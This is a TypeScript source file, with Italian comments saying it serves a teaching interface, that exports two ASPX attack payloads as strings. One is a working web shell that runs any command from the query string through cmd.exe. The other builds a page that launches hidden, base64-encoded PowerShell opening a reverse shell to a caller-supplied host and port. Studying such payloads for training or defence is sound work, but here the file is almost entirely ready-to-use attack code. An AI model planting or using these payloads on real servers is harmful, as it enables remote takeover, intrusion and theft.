/**
 * Payload ASPX / PowerShell di esempio. Servono SOLO per essere mostrati
 * come testo dentro l'interfaccia didattica: non vengono mai eseguiti.
 */

export const SIMPLE_WEBSHELL_ASPX = `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<html><body>
<form method="get">
  <input name="cmd" style="width:400px" />
  <button type="submit">run</button>
</form>
<pre>
<%
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    Response.Write(p.StandardOutput.ReadToEnd());
  }
%>
</pre>
</body></html>`;

export const REVERSE_SHELL_ASPX = (host: string, port: number) =>
  `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
  // Trigger: apri questa pagina nel browser.
  // In un attacco reale il payload apre una connessione TCP verso
  // l'attaccante e collega stdin/stdout di cmd.exe al socket.
  string ps = @"$c=New-Object System.Net.Sockets.TCPClient('${host}',${port});" +
              @"$s=$c.GetStream();[byte[]]$b=0..65535|%{0};" +
              @"while(($i=$s.Read($b,0,$b.Length)) -ne 0){" +
              @" $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);" +
              @" $r=(iex $d 2>&1 | Out-String);" +
              @" $rb=([text.encoding]::ASCII).GetBytes($r);" +
              @" $s.Write($rb,0,$rb.Length);$s.Flush()}";
  ProcessStartInfo psi = new ProcessStartInfo(
    "powershell.exe",
    "-nop -w hidden -enc " + System.Convert.ToBase64String(
      System.Text.Encoding.Unicode.GetBytes(ps)));
  psi.UseShellExecute = false;
  Process.Start(psi);
  Response.Write("ok");
%>`;
